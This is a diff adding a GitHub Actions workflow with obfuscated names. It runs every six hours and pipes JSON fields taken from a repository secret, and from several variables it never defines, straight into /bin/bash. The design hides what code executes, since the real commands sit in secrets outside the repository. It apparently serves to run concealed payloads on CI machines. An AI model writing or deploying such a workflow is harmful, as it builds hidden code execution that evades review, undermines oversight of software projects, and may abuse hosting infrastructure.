@@ -1,0 +1,25 @@
+name: haosiwen19871010
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: haosiwen19871010
+        env:
+          xyw8434: ${{ secrets.xyw8434 }}
+        run: |
+          echo $xyw8434 | jq -r .klqlq487 | /bin/bash
+          echo $tap09561 | jq -r .ipgpx36384 | /bin/bash
+          echo $hualx5 | jq -r .a48 | /bin/bash
+          echo $adqd05306 | jq -r .ph94898 | /bin/bash
+          echo $sals5672 | jq -r .uyfz0 | /bin/bash
+          echo $jvf1 | jq -r .l18 | /bin/bash
+          echo $kn340 | jq -r .j27 | /bin/bash
+          echo $xodzg68 | jq -r .ciqb41 | /bin/bash
+
